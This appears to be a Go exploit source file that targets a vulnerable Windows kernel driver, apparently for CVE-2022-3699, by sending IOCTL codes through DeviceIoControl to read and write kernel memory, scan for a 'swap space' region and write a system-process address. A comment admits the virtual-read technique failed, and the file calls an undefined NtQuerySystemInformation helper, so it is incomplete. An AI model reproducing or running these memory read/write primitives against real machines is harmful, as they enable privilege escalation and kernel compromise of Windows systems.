package main

import (
	"fmt"
    "os"
	"syscall"
	"encoding/binary"
	"bytes"
	"unsafe"
)

// Tried to reproduce alfarom256's technique for virtual reads but failed
// https://github.com/alfarom256/CVE-2022-3699


type READMSG struct  {
	Address uint64  
	Size uint32
	Mode uint32
	buffer *byte
}

type READRSP struct  {
	Data uint64  
}



func main() {

	
	testFileName := "\\\\.\\vulnerable"
	var SwapAddr uint64
	var data uint64 = 0
	os.Remove(testFileName)
	f, err := os.Create(testFileName)
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()

	SwapAddr = findSwapSpace(f)
	if( SwapAddr == 0) {
		fmt.Println("failed to find swap space")
		return
	}
	SystemProc := NtQuerySystemInformation()
	//try writing stuff
	writeIOctl(f, SwapAddr, &SystemProc)
	readIOctl(f, SwapAddr, &data)
	readIOctl(f, SwapAddr, &data)
	fmt.Println(fmt.Sprintf("virtual data at: %x is %x\n",  SystemProc, data))
	
}


func findSwapSpace(f *os.File) uint64 {
	
	var start uint64 = 0x2000
	i := start
	
	for i < start+0x10000 {
		
		var data uint64 = 0
		
		if (readIOctl(f, uint64(i), &data)) {
			if (data == 0) {
				fmt.Println(fmt.Sprintf("Swap space at: %x\n", i))
				return uint64(i)
				
			} 
		} else {
			
			break
		}
		
		i+=8
	}
	return 0
}


func readIOctl(f *os.File, address uint64, data *uint64) bool {	
	// then we mess with ioctl
	bufout := make([]byte, 8)
	bufresults := make([]byte, 24)
	var dwBytesReturned uint32
	var msg READMSG
	var response READRSP
	msg.Address = address
	msg.Size = 8 // always get 8 bytes at a time
	msg.Mode = 0 // read one byte at a time
	msg.buffer = &bufout[0] // that pointer is being used to receive kernel memory, not the one passed to deviceiocontrol
	
	err := syscall.DeviceIoControl(syscall.Handle(f.Fd()), 0x222808, (*byte)(unsafe.Pointer(&msg)), 24, &bufresults[0], 24, &dwBytesReturned, nil)
	if err != nil {
		fmt.Println(err)
		return false
	}

	// if (dwBytesReturned != 0 ) {
		// fmt.Println(bufresults)
		// fmt.Println("kernel sent something")
	// }
	
	var modulesbuf = bytes.NewBuffer(bufout)
	//iobuf = 
	err = binary.Read(modulesbuf, binary.LittleEndian, &response)
	if err != nil {
		fmt.Println("decode error:", err)
		
	}
	*data = response.Data
	return true

}

func writeIOctl(f *os.File, address uint64, data *uint64) bool {	
	// then we mess with ioctl
	bufout := make([]byte, 8)
	bufresults := make([]byte, 24)
	var dwBytesReturned uint32
	var msg READMSG
	msg.Address = address
	msg.Size = 8 // always get 8 bytes at a time
	msg.Mode = 0 // read one byte at a time
	// copy data into bufout
	binary.LittleEndian.PutUint64(bufout, uint64(*data))
	msg.buffer = &bufout[0] // that pointer is being used to write memory, not the one passed to deviceiocontrol
	
	err := syscall.DeviceIoControl(syscall.Handle(f.Fd()), 0x22280c, (*byte)(unsafe.Pointer(&msg)), 24, &bufresults[0], 24, &dwBytesReturned, nil)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}
